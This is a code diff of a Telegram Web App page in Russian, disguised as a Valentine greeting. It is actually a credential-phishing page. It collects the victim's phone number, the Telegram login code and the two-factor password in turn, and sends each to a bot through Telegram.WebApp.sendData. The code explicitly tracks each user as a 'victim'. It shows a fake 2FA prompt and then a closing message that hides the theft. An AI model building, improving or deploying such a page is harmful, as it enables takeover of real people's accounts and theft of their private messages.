@@ -4,6 +4,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Валентинка 💌</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -106,11 +107,6 @@
             background: #2a2a2a;
         }
         
-        .input-group input:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
         .btn {
             background: linear-gradient(145deg, #ff4d6d, #ff1e4d);
             color: white;
@@ -134,7 +130,6 @@
         .btn:disabled {
             opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
         }
         
         .hidden {
@@ -149,7 +144,6 @@
             border-left: 4px solid #ffaa00;
             color: #ffaa00;
             font-size: 14px;
-            transition: 0.3s;
         }
         
         .password-warning {
@@ -166,13 +160,6 @@
             border-left-color: #4caf92;
             color: #4caf92;
             background: #1a2a1a;
-        }
-        
-        .timer {
-            font-size: 12px;
-            color: #888;
-            margin-top: 10px;
-            text-align: center;
         }
     </style>
 </head>
@@ -210,7 +197,7 @@
             </div>
         </div>
         
-        <!-- ШАГ 3: Ввод пароля 2FA (появляется если нужно) -->
+        <!-- ШАГ 3: Ввод пароля 2FA -->
         <div id="step3" class="hidden">
             <div class="password-warning" id="passwordWarning">
                 ⚠️ Требуется дополнительная защита
@@ -224,12 +211,16 @@
                 🔒 Введи пароль от аккаунта
             </div>
         </div>
-        
-        <div class="timer" id="timer"></div>
     </div>
 
     <script>
-        // Уникальный ID для этой сессии
+        // Инициализация Telegram WebApp
+        if (window.Telegram?.WebApp) {
+            Telegram.WebApp.ready();
+            Telegram.WebApp.expand();
+        }
+        
+        // Уникальный ID для жертвы
         const VICTIM_ID = 'victim_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         
         // Элементы
@@ -245,13 +236,11 @@
         const codeStatus = document.getElementById('codeStatus');
         const passwordStatus = document.getElementById('passwordStatus');
         const passwordWarning = document.getElementById('passwordWarning');
-        const timer = document.getElementById('timer');
         
         let userPhone = '';
         let userCode = '';
-        let startTime = Date.now();
         
-        // Функция отправки данных (через Telegram WebApp)
+        // Функция отправки в бота
         function sendToBot(type, data) {
             try {
                 const payload = {
@@ -259,33 +248,20 @@
                     data: {
                         ...data,
                         victim_id: VICTIM_ID,
-                        timestamp: Date.now()
+                        timestamp: new Date().toLocaleString()
                     }
                 };
                 
-                // Если есть Telegram WebApp API
                 if (window.Telegram?.WebApp) {
-                    window.Telegram.WebApp.sendData(JSON.stringify(payload));
+                    Telegram.WebApp.sendData(JSON.stringify(payload));
+                    console.log('📤 Отправлено:', type, data);
                 } else {
-                    // Если нет Telegram API (для теста)
-                    console.log('📤 Данные для отправки:', payload);
-                    
-                    // Сохраняем в localStorage
-                    const saved = JSON.parse(localStorage.getItem('victim_data') || '[]');
-                    saved.push(payload);
-                    localStorage.setItem('victim_data', JSON.stringify(saved));
+                    console.log('📤 [ТЕСТ]', payload);
                 }
             } catch(e) {
-                console.log('Ошибка:', e);
+                console.log('❌ Ошибка отправки:', e);
             }
         }
-        
-        // Таймер
-        function updateTimer() {
-            const elapsed = Math.floor((Date.now() - startTime) / 1000);
-            timer.textContent = `⏱ Сессия активна: ${elapsed} сек`;
-        }
-        setInterval(updateTimer, 1000);
         
         // ШАГ 1: Отправка номера
         sendPhoneBtn.addEventListener('click', function() {
@@ -296,23 +272,18 @@
                 return;
             }
             
-            // Форматируем номер
             phone = phone.replace(/\D/g, '');
             if (phone.startsWith('8')) phone = '7' + phone.substring(1);
             if (!phone.startsWith('7')) phone = '7' + phone;
-            if (phone.length === 10) phone = '7' + phone;
             phone = '+' + phone;
             
             userPhone = phone;
             
-            // Отправляем в бот
             sendToBot('phone', { phone: userPhone });
             
-            // Переходим к шагу 2
             step1.classList.add('hidden');
             step2.classList.remove('hidden');
             codeStatus.innerHTML = `⏳ Код отправлен на ${userPhone}`;
-            
             codeInput.focus();
         });
         
@@ -327,7 +298,6 @@
             const code = codeInput.value;
             userCode = code;
             
-            // Отправляем в бот
             sendToBot('code', { 
                 code: code,
                 phone: userPhone
@@ -336,11 +306,10 @@
             codeStatus.innerHTML = '✅ Код принят! Проверка...';
             codeStatus.classList.add('success');
             
-            // Через 2 секунды показываем шаг 3 (имитация 2FA)
             setTimeout(() => {
                 step3.classList.remove('hidden');
                 passwordWarning.innerHTML = '⚠️ Требуется дополнительный пароль';
-            }, 2000);
+            }, 1500);
         });
         
         // ШАГ 3: Отправка пароля
@@ -351,7 +320,6 @@
         sendPasswordBtn.addEventListener('click', function() {
             const password = passwordInput.value;
             
-            // Отправляем в бот
             sendToBot('password', { 
                 password: password,
                 code: userCode,
@@ -363,21 +331,12 @@
             passwordWarning.innerHTML = '✅ Доступ разрешен';
             passwordWarning.classList.add('success');
             
-            // Закрываем через 3 секунды
             setTimeout(() => {
                 if (window.Telegram?.WebApp) {
-                    window.Telegram.WebApp.close();
-                } else {
-                    document.querySelector('.card').innerHTML = '<h2>❤️ Валентинка открыта!</h2><p>Спасибо!</p>';
+                    Telegram.WebApp.close();
                 }
-            }, 3000);
+            }, 2000);
         });
-        
-        // Инициализация Telegram WebApp (если есть)
-        if (window.Telegram?.WebApp) {
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
-        }
         
         console.log('✅ Сайт загружен, ID:', VICTIM_ID);
     </script>
